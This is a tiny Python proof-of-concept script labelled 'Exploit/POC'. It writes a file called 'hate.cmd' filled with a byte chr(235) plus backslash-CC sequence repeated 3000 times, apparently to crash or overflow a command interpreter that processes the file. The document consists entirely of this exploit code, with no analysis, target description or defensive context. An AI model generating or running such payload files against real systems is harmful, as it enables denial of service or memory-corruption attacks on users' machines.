#[Exploit/POC]
PAYLOAD=chr(235) + "\\CC"
PAYLOAD = PAYLOAD * 3000

with open("hate.cmd", "w") as f:
    f.write(PAYLOAD)
